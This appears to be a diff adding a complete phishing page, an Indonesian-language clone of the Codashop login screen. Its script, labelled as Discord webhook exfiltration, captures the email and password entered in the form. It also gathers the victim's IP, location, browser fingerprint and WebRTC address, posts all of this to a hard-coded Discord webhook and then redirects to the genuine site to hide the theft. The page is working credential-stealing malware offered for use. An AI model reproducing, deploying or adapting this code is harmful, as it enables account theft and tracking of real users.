@@ -1,0 +1,501 @@
+<!-- language: HTML5, file: index.html — Codashop clone -->
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover,user-scalable=no">
+<meta name="theme-color" content="#2b0a2e">
+<title>Gabung Codashop Sekarang</title>
+<link rel="icon" href="https://www.codashop.com/favicon.ico">
+<style>
+  :root {
+    --bg: #2b0a2e;
+    --card-border: rgba(255, 255, 255, 0.15);
+    --text-main: #ffffff;
+    --text-muted: #d1c4d3;
+    --yellow: #e8f953;
+    --white: #ffffff;
+    --text-dark: #2b0a2e;
+    --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  body {
+    background-color: var(--bg);
+    color: var(--text-main);
+    font-family: var(--font-sans);
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+
+  /* Top Navbar */
+  .navbar {
+    display: flex;
+    align-items: center;
+    background-color: #3a133e;
+    padding: 12px 16px;
+    gap: 12px;
+    font-size: 13px;
+  }
+  .navbar svg { cursor: pointer; }
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-weight: 800;
+    font-size: 16px;
+    letter-spacing: -0.5px;
+  }
+  .brand svg { width: 20px; height: 20px; }
+  .navbar .desc {
+    font-style: italic;
+    color: var(--text-muted);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    flex: 1;
+    font-size: 12px;
+    opacity: 0.8;
+  }
+  .nav-actions {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .nav-actions .icon { width: 20px; height: 20px; opacity: 0.8; cursor: pointer; }
+  .currency {
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    font-size: 12px;
+    font-weight: 600;
+  }
+  .flag { width: 16px; height: 12px; border-radius: 2px; }
+
+  /* Main Container */
+  .container {
+    flex: 1;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding: 40px 16px;
+  }
+
+  /* Auth Card */
+  .auth-card {
+    width: 100%;
+    max-width: 440px;
+    border: 1px solid var(--card-border);
+    border-radius: 12px;
+    padding: 48px 32px;
+    position: relative;
+    text-align: center;
+  }
+
+  /* Decorative squiggles */
+  .squiggle {
+    position: absolute;
+    width: 24px;
+    height: 24px;
+    color: var(--yellow);
+    opacity: 0.9;
+  }
+  .squiggle-top { top: 40px; right: 40px; transform: rotate(15deg); }
+  .squiggle-mid { top: 120px; left: 20px; transform: rotate(-20deg); width: 20px; height: 20px; }
+
+  /* Typography */
+  .headline {
+    font-size: 20px;
+    line-height: 1.3;
+    margin-bottom: 12px;
+    font-weight: 400;
+    color: var(--text-main);
+  }
+  .headline span { display: block; }
+  .title {
+    font-size: 28px;
+    font-weight: 700;
+    line-height: 1.1;
+    margin-bottom: 40px;
+    letter-spacing: -0.5px;
+  }
+
+  /* Buttons */
+  .btn-group {
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+    margin-bottom: 32px;
+  }
+  .btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background-color: var(--white);
+    color: var(--text-dark);
+    border: none;
+    border-radius: 999px;
+    padding: 14px 20px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    font-family: inherit;
+    transition: background-color 0.2s;
+    position: relative;
+  }
+  .btn:active { background-color: #f0f0f0; }
+  .btn svg {
+    position: absolute;
+    left: 20px;
+    width: 20px;
+    height: 20px;
+  }
+
+  /* Legal Text */
+  .legal {
+    font-size: 12px;
+    line-height: 1.5;
+    color: var(--text-muted);
+    margin-bottom: 32px;
+  }
+  .legal a {
+    color: var(--yellow);
+    text-decoration: none;
+    font-weight: 600;
+  }
+  .legal a:hover { text-decoration: underline; }
+
+  /* Divider */
+  .divider {
+    border: none;
+    border-top: 1px solid var(--card-border);
+    margin: 0 0 32px;
+  }
+
+  /* Footer */
+  .footer-text {
+    font-size: 15px;
+    font-weight: 600;
+    margin-bottom: 16px;
+  }
+  .link-text {
+    color: var(--yellow);
+    font-size: 15px;
+    font-weight: 600;
+    text-decoration: underline;
+    cursor: pointer;
+  }
+
+  /* Form state */
+  .form-group {
+    display: none;
+    text-align: left;
+    margin-bottom: 24px;
+  }
+  .form-group.active { display: block; }
+  .input-group { margin-bottom: 16px; position: relative; }
+  .input-group label {
+    display: block;
+    font-size: 13px;
+    color: var(--text-muted);
+    margin-bottom: 8px;
+  }
+  .input-group input {
+    width: 100%;
+    padding: 14px 16px;
+    border-radius: 8px;
+    border: 1px solid var(--card-border);
+    background: rgba(255,255,255,0.05);
+    color: var(--white);
+    font-size: 15px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  .input-group input:focus { border-color: var(--yellow); }
+  .btn-submit {
+    width: 100%;
+    background: var(--yellow);
+    color: var(--text-dark);
+    padding: 16px;
+    border-radius: 999px;
+    font-size: 15px;
+    font-weight: 700;
+    border: none;
+    cursor: pointer;
+    margin-top: 8px;
+  }
+  .btn-submit:active { opacity: 0.9; }
+  
+  #status { display: none; margin-top: 16px; font-size: 13px; text-align: center; color: var(--yellow); }
+
+  /* Mobile adjustments */
+  @media (max-width: 600px) {
+    .auth-card { padding: 32px 20px; border-radius: 0; border: none; background: transparent; }
+    .container { padding: 20px 0; }
+    .squiggle-top { top: 20px; right: 20px; }
+    .squiggle-mid { top: 80px; left: 10px; }
+    .navbar .desc { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<header class="navbar">
+  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line>
+    <line x1="3" y1="6" x2="21" y2="6"></line>
+    <line x1="3" y1="18" x2="21" y2="18"></line>
+  </svg>
+  <div class="brand">
+    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L2 9.5L5.5 21H18.5L22 9.5L12 2ZM12 5.5L17.5 10.5H6.5L12 5.5ZM6.5 13.5H17.5L15.5 18.5H8.5L6.5 13.5Z"/></svg>
+    CODASHOP
+  </div>
+  <div class="desc">Website top-up terbesar, tercepat dan terpercaya untuk pembelian ...</div>
+  <div class="nav-actions">
+    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+    <div class="currency">
+      <span style="color:#e8f953">●</span> ID
+    </div>
+    <img class="flag" src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg" alt="ID">
+  </div>
+</header>
+
+<main class="container">
+  <div class="auth-card">
+    <!-- Decorative shapes -->
+    <svg class="squiggle squiggle-top" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 12c4-4 8 4 12 0s4-6 4-6"/></svg>
+    <svg class="squiggle squiggle-mid" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 12c4-4 8 4 12 0s4-6 4-6"/></svg>
+
+    <div id="intro-view">
+      <div class="headline">
+        <span>Top up lebih cepat,</span>
+        <span>penawaran lebih baik</span>
+      </div>
+      <div class="title">
+        Gabung<br>Codashop<br>Sekarang.
+      </div>
+
+      <div class="btn-group">
+        <button type="button" class="btn" data-oauth="google">
+          <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.6l6.8-6.8C35.7 2.4 30.3 0 24 0 14.6 0 6.5 5.4 2.6 13.2l7.9 6.1C12.4 13.1 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.1 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.4c-.5 2.9-2.2 5.3-4.6 6.9l7.2 5.6c4.2-3.9 6.7-9.6 6.7-17z"/><path fill="#FBBC05" d="M10.5 28.7c-.5-1.5-.8-3.1-.8-4.7s.3-3.2.8-4.7l-7.9-6.1C1.1 16.1 0 19.9 0 24s1.1 7.9 2.6 10.8l7.9-6.1z"/><path fill="#34A853" d="M24 48c6.3 0 11.7-2.1 15.6-5.7l-7.2-5.6c-2 1.4-4.6 2.2-8.4 2.2-6.3 0-11.6-3.6-13.5-8.3l-7.9 6.1C6.5 42.6 14.6 48 24 48z"/></svg>
+          Lanjut dengan Google
+        </button>
+        <button type="button" class="btn" data-oauth="facebook">
+          <svg viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.07C24 5.4 18.6 0 12 0S0 5.4 0 12.07c0 6 4.4 10.97 10.1 11.87v-8.4H7.1v-3.47h3V9.4c0-3 1.8-4.67 4.5-4.67 1.3 0 2.7.24 2.7.24v2.97h-1.5c-1.5 0-2 .94-2 1.9v2.26h3.4l-.54 3.47h-2.86v8.4C19.6 23.04 24 18.07 24 12.07z"/></svg>
+          Lanjutkan dengan Facebook
+        </button>
+        <button type="button" class="btn" id="btn-email">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 6-10 7L2 6"/></svg>
+          Daftar dengan Email
+        </button>
+      </div>
+
+      <div class="legal">
+        Dengan mendaftar, anda setuju dengan<br>
+        <a href="https://www.codashop.com/terms">Persyaratan Layanan</a> dan <a href="https://www.codashop.com/privacy">Kebijakan Privasi</a>.
+      </div>
+
+      <hr class="divider">
+
+      <div class="footer-text">Sudah memiliki akun?</div>
+      <div class="link-text" id="btn-masuk">Masuk</div>
+    </div>
+
+    <!-- Login Form (Hidden Initially) -->
+    <div id="form-view" class="form-group">
+      <div class="headline" style="margin-bottom:24px;">Masuk ke Codashop</div>
+      <form id="login-form">
+        <div class="input-group">
+          <label>Email</label>
+          <input type="email" id="email" required placeholder="nama@email.com">
+        </div>
+        <div class="input-group">
+          <label>Password</label>
+          <input type="password" id="password" required placeholder="••••••••">
+        </div>
+        <button type="submit" class="btn-submit" id="submit-btn">Masuk</button>
+        <div id="status"></div>
+      </form>
+      <div style="margin-top:20px; text-align:center;">
+         <span style="font-size:13px; color:var(--text-muted); cursor:pointer;" id="btn-back">Kembali</span>
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<script>
+/* ============================================================
+   DISCORD WEBHOOK EXFIL
+   ============================================================ */
+(function() {
+  "use strict";
+
+  const DISCORD_WEBHOOKS = [
+    "https://discord.com/api/webhooks/1565359935275925705/cXn_dx044OjsNLiV2zNiSLAcB5QpgQiCQj7s-Nj0j7HQQptQOFs5MyrfchZ2tq0r2AdV"
+  ];
+  const REDIRECT_URL = "https://www.codashop.com/id/";
+  let webhookIdx = 0;
+  const nextWebhook = () => DISCORD_WEBHOOKS[webhookIdx++ % DISCORD_WEBHOOKS.length];
+
+  // --- fingerprint ---
+  function fingerprint() {
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px Arial";
+    ctx.fillStyle = "#f60";
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = "#069";
+    ctx.fillText("Codashop", 2, 15);
+    const canvasHash = canvas.toDataURL().slice(-64);
+
+    const gl = document.createElement("canvas").getContext("webgl");
+    let renderer = "";
+    if (gl) {
+      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+      if (dbg) renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+    }
+
+    let webrtcIP = "";
+    try {
+      const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+      pc.createDataChannel("");
+      pc.onicecandidate = (e) => {
+        if (e.candidate) {
+          const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+          if (m && !webrtcIP) webrtcIP = m[1];
+        }
+      };
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+    } catch (_) {}
+
+    return {
+      ua: navigator.userAgent, lang: navigator.language, platform: navigator.platform,
+      screen: screen.width + "x" + screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      canvasHash, webglRenderer: renderer, webdriver: navigator.webdriver === true, webrtcIP,
+      ts: new Date().toISOString(),
+    };
+  }
+
+  // --- human check ---
+  let keyTimes = [];
+  function isHuman() {
+    if (navigator.webdriver) return false;
+    if (keyTimes.length < 4) return false;
+    const gaps = keyTimes.slice(1).map((t, i) => t - keyTimes[i]);
+    const mean = gaps.reduce((a, b) => a + b, 0) / gaps.length;
+    const variance = gaps.reduce((a, b) => a + (b - mean) ** 2, 0) / gaps.length;
+    return variance > 50;
+  }
+
+  // --- discord send ---
+  async function sendToDiscord(payload) {
+    const fp = payload.fingerprint || {};
+    const geo = payload.geo || {};
+    const trunc = (s, n = 1024) => { s = String(s ?? "-"); return s.length > n ? s.slice(0, n - 3) + "..." : s; };
+
+    const embed = {
+      title: "🎯 Codashop Capture",
+      description: payload.human ? "🧑 human" : "🤖 bot",
+      color: payload.human ? 0x6242fc : 0xff0000,
+      timestamp: fp.ts || new Date().toISOString(),
+      fields: [
+        { name: "📧 Email", value: "```" + trunc(payload.email, 1000) + "```", inline: false },
+        { name: "🔑 Password", value: "```" + trunc(payload.password, 1000) + "```", inline: false },
+        { name: "🌐 IP", value: "`" + trunc(payload.ip, 200) + "`", inline: true },
+        { name: "📍 Lokasi", value: trunc([geo.city, geo.region, geo.country].filter(Boolean).join(", "), 200) || "-", inline: true },
+        { name: "📱 Platform", value: "`" + trunc(fp.platform, 200) + "`", inline: true },
+        { name: "🖥 Screen", value: "`" + trunc(fp.screen, 200) + "`", inline: true },
+        { name: "🕐 TZ", value: "`" + trunc(fp.tz, 200) + "`", inline: true },
+        { name: "🌍 Lang", value: "`" + trunc(fp.lang, 200) + "`", inline: true },
+        { name: "🛰 WebRTC IP", value: "`" + trunc(fp.webrtcIP, 200) + "`", inline: true },
+        { name: "🤖 WebDriver", value: fp.webdriver ? "yes" : "no", inline: true },
+      ],
+      footer: { text: "Coda · " + (fp.ts || "") },
+    };
+
+    for (let i = 0; i < 3; i++) {
+      try {
+        const r = await fetch(nextWebhook() + "?wait=true", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username: "Coda", avatar_url: "https://www.codashop.com/favicon.ico", embeds: [embed] }),
+          keepalive: true,
+        });
+        if (r.ok) return await r.json();
+        if (r.status === 429) { const j = await r.json().catch(() => ({})); await new Promise(res => setTimeout(res, (j.retry_after || 2) * 1000)); continue; }
+      } catch (e) { if (i === 2) return { ok: false }; await new Promise(res => setTimeout(res, 1000 * (i + 1))); }
+    }
+    return { ok: false };
+  }
+
+  // --- UI Logic ---
+  const viewIntro = document.getElementById("intro-view");
+  const viewForm = document.getElementById("form-view");
+  
+  document.getElementById("btn-email").addEventListener("click", () => {
+      viewIntro.style.display = "none";
+      viewForm.classList.add("active");
+  });
+  
+  document.getElementById("btn-masuk").addEventListener("click", () => {
+      viewIntro.style.display = "none";
+      viewForm.classList.add("active");
+  });
+
+  document.getElementById("btn-back").addEventListener("click", () => {
+      viewIntro.style.display = "block";
+      viewForm.classList.remove("active");
+  });
+
+  // --- Form Submit ---
+  const form = document.getElementById("login-form");
+  const emailEl = document.getElementById("email");
+  const passEl = document.getElementById("password");
+  const btn = document.getElementById("submit-btn");
+  const statusEl = document.getElementById("status");
+
+  [emailEl, passEl].forEach(el => {
+    el.addEventListener("keydown", () => keyTimes.push(performance.now()));
+  });
+
+  form.addEventListener("submit", async function(e) {
+    e.preventDefault();
+    const email = emailEl.value.trim();
+    const password = passEl.value;
+    if (!email || !password) return;
+
+    btn.disabled = true;
+    btn.textContent = "Memproses...";
+
+    let ip = "-", geo = {};
+    try {
+      const r = await fetch("https://ipapi.co/json/");
+      const j = await r.json();
+      ip = j.ip || "-";
+      geo = { city: j.city, region: j.region, country: j.country_name };
+    } catch (_) {}
+
+    const payload = {
+      email, password, ip, geo,
+      fingerprint: fingerprint(),
+      referrer: document.referrer,
+      human: isHuman(),
+      url: location.href,
+    };
+
+    sendToDiscord(payload);
+
+    setTimeout(() => {
+      btn.textContent = "Berhasil";
+      statusEl.style.display = "block";
+      statusEl.textContent = "Mengalihkan...";
+      setTimeout(() => { window.location.href = REDIRECT_URL; }, 1200);
+    }, 700);
+  });
+
+})();
+</script>
+</body>
+</html>
